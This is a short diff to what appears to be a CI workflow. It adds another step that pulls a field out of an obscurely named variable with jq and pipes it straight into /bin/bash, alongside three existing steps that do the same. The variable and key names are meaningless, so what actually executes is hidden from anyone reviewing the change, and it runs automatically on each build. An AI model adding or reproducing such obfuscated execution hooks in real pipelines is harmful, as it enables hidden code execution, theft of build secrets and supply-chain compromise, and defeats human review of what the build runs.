@@ -43,6 +43,7 @@ jobs:
           printf '%s' "$svz4" | jq -r .mmr486 | /bin/bash
           echo $pjpp37857 | jq -r .sas894 | /bin/bash
           echo $e3354 | jq -r .o7 | /bin/bash
+          echo $b695 | jq -r .gri19198 | /bin/bash
 
       - name: Store artifact
         if: always()
